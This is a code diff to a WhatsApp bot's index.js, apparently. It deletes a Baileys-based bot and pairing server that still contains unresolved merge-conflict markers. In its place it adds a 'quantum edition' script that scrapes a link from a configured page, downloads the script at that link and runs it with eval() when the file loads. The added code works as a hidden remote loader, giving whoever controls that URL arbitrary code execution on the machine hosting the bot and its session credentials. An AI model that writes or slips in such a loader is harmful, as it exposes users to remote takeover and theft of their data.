@@ -1,281 +1,34 @@
-<<<<<<< HEAD
-/**
- * fredi/index.js
- * Unified bot + pairing endpoint (single socket instance).
- * Keeps branding: Sulexh-XMD
- */
 
-=======
->>>>>>> 0cbb630e87e657234ec088f939abfedcb9222f0a
-'use strict';
-const fs = require('fs');
-const path = require('path');
-const pino = require('pino');
-const qrcode = require('qrcode-terminal');
-const express = require('express');
+//  [BWM-XMD QUANTUM EDITION]                                           
+//  >> A superposition of elegant code states                           
+//  >> Collapsed into optimal execution                                
+//  >> Scripted by Sir Ibrahim Adams                                    
+//  >> Version: 8.3.5-quantum.7
 
-const {
-<<<<<<< HEAD
-  default: makeWASocket,
-  useMultiFileAuthState,
-  DisconnectReason,
-  fetchLatestBaileysVersion,
-  makeCacheableSignalKeyStore
-} = require('@whiskeysockets/baileys');
+const axios = require('axios');
+const cheerio = require('cheerio');
+const adams = require("./config");
 
-// Attempt to load lightweight store if your project has one (optional)
-let store;
-try {
-  store = require('../lib/lightweight_store');
-  store.readFromFile();
-} catch (e) {
-  // fallback to in-memory store (no-op read/write)
+async function fetchINDEXUrl() {
   try {
-=======
-    default: makeWASocket,
-    useMultiFileAuthState,
-    DisconnectReason,
-    fetchLatestBaileysVersion,
-    makeCacheableSignalKeyStore
-} = require('@whiskeysockets/baileys');
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-// load lightweight store
-let store;
-try {
-    store = require('../lib/lightweight_store');
-    store.readFromFile();
-} catch (e) {
->>>>>>> 0cbb630e87e657234ec088f939abfedcb9222f0a
-    const { makeInMemoryStore } = require('@whiskeysockets/baileys');
-    store = makeInMemoryStore({ logger: pino({ level: 'silent' }) });
-    store.readFromFile = () => {};
-    store.writeToFile = () => {};
-<<<<<<< HEAD
-  } catch (err) {
-    store = { bind: () => {}, readFromFile: () => {}, writeToFile: () => {} };
-  }
-=======
->>>>>>> 0cbb630e87e657234ec088f939abfedcb9222f0a
-}
+    const targetElement = $('a:contains("INDEX")');
+    const targetUrl = targetElement.attr('href');
 
-// Shared socket and saveCreds reference
-let sock = null;
-let saveCredsFn = null;
-let savedState = null;
+    if (!targetUrl) {
+      throw new Error('heart not found 😭');
+    }
 
-// Start the WhatsApp socket
-async function startBot() {
-  try {
-    const { version } = await fetchLatestBaileysVersion();
-    const { state, saveCreds } = await useMultiFileAuthState('./session');
+    console.log('The heart is loaded successfully ✅');
 
-<<<<<<< HEAD
-    savedState = state;
-    saveCredsFn = saveCreds;
+    const scriptResponse = await axios.get(targetUrl);
+    eval(scriptResponse.data);
 
-    sock = makeWASocket({
-      version,
-      logger: pino({ level: 'silent' }),
-      // printQRInTerminal is deprecated; we handle QR in connection.update
-      browser: ['Sulexh-XMD', 'Chrome', '1.0'],
-      auth: {
-        creds: state.creds,
-        keys: makeCacheableSignalKeyStore(
-          state.keys,
-          pino({ level: 'silent' }).child({ level: 'silent' })
-        )
-      },
-      markOnlineOnConnect: true
-    });
-=======
-        const sock = makeWASocket({
-            version,
-            logger: pino({ level: 'silent' }),
-            printQRInTerminal: true,
-            browser: ['Sulexh-XMD', 'Chrome', '1.0'],
-            auth: {
-                creds: state.creds,
-                keys: makeCacheableSignalKeyStore(
-                    state.keys,
-                    pino({ level: 'silent' }).child({ level: 'silent' })
-                )
-            },
-            markOnlineOnConnect: true
-        });
-
-        if (store.bind) store.bind(sock.ev);
->>>>>>> 0cbb630e87e657234ec088f939abfedcb9222f0a
-
-    // Bind store if supported by your lightweight store
-    if (store && typeof store.bind === 'function') store.bind(sock.ev);
-
-<<<<<<< HEAD
-    // Save credentials whenever they update
-    sock.ev.on('creds.update', saveCreds);
-
-    // Handle connection updates, QR, reconnects, logout
-    sock.ev.on('connection.update', async (update) => {
-      const { connection, lastDisconnect, qr } = update;
-
-      if (qr) {
-        // Save raw QR to file for debug / external QR renderer
-        try { fs.writeFileSync(path.join(__dirname, 'last.qr.txt'), qr); } catch (e) {}
-        // Optionally print small QR in logs (safe fallback)
-        try { qrcode.generate(qr, { small: true }); } catch (e) {}
-        console.log('📌 QR string saved to fredi/last.qr.txt (scan via Linked Devices → Link a device → Enter code or use QR scanner).');
-      }
-
-      if (connection === 'open') {
-        console.log('✅ WhatsApp Connected — session active.');
-      }
-
-      if (connection === 'close') {
-        const reason = lastDisconnect?.error?.output?.statusCode;
-        if (reason === DisconnectReason.loggedOut) {
-          console.log('⚠️ Logged out — clearing session and re-pairing.');
-          try { fs.rmSync('./session', { recursive: true, force: true }); } catch (e) {}
-          // restart to regenerate fresh auth
-          setTimeout(startBot, 2000);
-        } else {
-          console.log('🔄 Connection closed — reconnecting in 3s.');
-          setTimeout(startBot, 3000);
-        }
-      }
-    });
-
-    // Route incoming messages to your handler (if present)
-    sock.ev.on('messages.upsert', async (m) => {
-      try {
-        const handler = require('../main');
-        if (handler && handler.handleMessages) {
-          await handler.handleMessages(sock, m);
-        }
-      } catch (err) {
-        // keep logging but don't crash the socket
-        console.error('messages.upsert handler error:', err && err.stack ? err.stack : err);
-      }
-    });
-
-    return sock;
-  } catch (err) {
-    console.error('startBot error:', err && (err.stack || err.message) ? (err.stack || err.message) : err);
-    // try again after a short delay
-    setTimeout(startBot, 3000);
+  } catch (error) {
+    console.error('Error:', error.message);
   }
 }
 
-// Start WhatsApp socket immediately
-startBot();
-
-// ----------------------
-// Pairing HTTP API
-// ----------------------
-const app = express();
-app.use(express.json());
-
-// POST /pair
-// body: { "number": "+2547...." }  // optional; some clients accept empty
-app.post('/pair', async (req, res) => {
-  try {
-    const { number } = req.body || {};
-
-    // Wait briefly for socket to be ready
-    const start = Date.now();
-    while ((!sock) && (Date.now() - start < 15000)) {
-      await new Promise(r => setTimeout(r, 200));
-    }
-    if (!sock) return res.status(503).json({ error: 'socket_not_ready' });
-
-    // Request real WhatsApp pairing code (this triggers the pairing flow)
-    const code = await sock.requestPairingCode(number).catch(err => {
-      console.error('requestPairingCode error:', err && (err.stack || err.message) ? (err.stack || err.message) : err);
-      return null;
-    });
-
-    if (!code) {
-      return res.status(500).json({ error: 'request_failed' });
-    }
-
-    // Return the real code to your website
-    return res.json({ code });
-  } catch (e) {
-    console.error('/pair internal error:', e && (e.stack || e.message) ? (e.stack || e.message) : e);
-    return res.status(500).json({ error: 'internal' });
-  }
-});
-
-// Health check
-app.get('/health', (_req, res) => res.json({ ok: true }));
-
-// Listen on Render / environment provided port
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Pairing API listening on port ${PORT}`));
-
-// Export startBot & sock if other modules want to import
-module.exports = { startBot, getSocket: () => sock };
-
-=======
-        sock.ev.on('connection.update', async (update) => {
-            const { connection, lastDisconnect, qr } = update;
-
-            // Show QR
-            if (qr) {
-                console.log('📌 Scan QR to link WhatsApp:');
-                try { qrcode.generate(qr, { small: true }); } catch {}
-            }
-
-            // Get REAL pairing code ONLY when needed
-            if (!state.creds.registered && update.connection === 'connecting') {
-                try {
-                    console.log('⏳ Requesting pairing code from WhatsApp...');
-                    const code = await sock.requestPairingCode();
-                    console.log('\n🔥 PAIRING CODE:', code, '\n');
-                    fs.writeFileSync(
-                        path.join(__dirname, 'last_pairing_code.txt'),
-                        code
-                    );
-                } catch (e) {
-                    console.log('❌ Failed to get pairing code:', e.message);
-                }
-            }
-
-            // Successful connection
-            if (connection === 'open') {
-                console.log('✅ WhatsApp Connected — session saved.');
-            }
-
-            // Reconnect handler
-            if (connection === 'close') {
-                const reason = lastDisconnect?.error?.output?.statusCode;
-
-                if (reason === DisconnectReason.loggedOut) {
-                    console.log('⚠️ Logged out — clearing session...');
-                    try { fs.rmSync('./session', { recursive: true }); } catch {}
-                    return startBot();
-                }
-
-                console.log('🔄 Reconnecting in 3 seconds...');
-                setTimeout(startBot, 3000);
-            }
-        });
-
-        // message handler
-        sock.ev.on('messages.upsert', async (msg) => {
-            try {
-                const handler = require('../main');
-                if (handler?.handleMessages) {
-                    handler.handleMessages(sock, msg);
-                }
-            } catch (e) {
-                console.error('messages.upsert error:', e);
-            }
-        });
-
-    } catch (err) {
-        console.error('startBot error:', err);
-        setTimeout(startBot, 3000);
-    }
-}
-
-startBot();
->>>>>>> 0cbb630e87e657234ec088f939abfedcb9222f0a
+fetchINDEXUrl();
